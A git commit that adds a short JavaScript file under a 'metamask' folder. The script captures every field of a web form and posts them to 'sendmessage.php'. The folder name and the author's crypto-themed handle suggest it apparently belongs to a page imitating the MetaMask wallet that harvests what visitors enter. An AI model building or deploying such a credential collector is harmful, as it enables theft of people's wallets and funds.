932e6585a959218f0bcec270d87276d879b9396e
vipusdtether <lancikangitu@outlook.com>
2024-08-15 10:44:18 +0700

    Add files via upload

---
+++ metamask/js/script.js
@@ -0,0 +1,22 @@
+"use strict"
+
+const form = document.querySelector('.form');
+form.addEventListener('submit', function (e) {
+	e.preventDefault();
+	sendMessage(form);
+})
+
+async function sendMessage(form) {
+	const formData = new FormData(form);
+	if (formData) {
+		const url = 'sendmessage.php';
+		const response = await fetch(url, {
+			method: "POST",
+			body: formData
+		});
+		if (response.ok) {
+		} else {
+			alert('Error');
+		}
+	}
+}
